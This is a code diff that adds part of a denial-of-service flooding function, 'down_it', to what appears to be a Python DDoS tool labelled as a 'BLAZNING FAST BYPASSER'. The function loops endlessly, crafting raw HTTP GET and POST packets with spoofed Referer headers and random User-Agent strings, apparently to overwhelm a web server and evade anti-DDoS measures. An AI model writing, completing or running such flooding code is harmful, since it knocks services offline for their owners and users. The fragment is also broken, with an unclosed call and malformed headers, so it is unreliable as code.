@@ -76,7 +76,18 @@ ONE_BROWSER_QUERYS_LIMIT = 1500
 ANTI_DDOS_SLEEP_SECS = 600
 
 ######################################## BLAZNING FAST BYPASSER
- 
+def down_it(item):
+	try:
+		while True:
+			if(port==80):
+				referer="http://"
+			elif(port==443):
+				referer="https://"
+			
+			if(method=="GET"):
+				packet = str("GET "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			elif(method=="POST"):
+				packet = str("POST "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data+"\n\n"+data_post).encode('utf-8' 
 ########################################### 
   
 ##################D1MOD FILE 
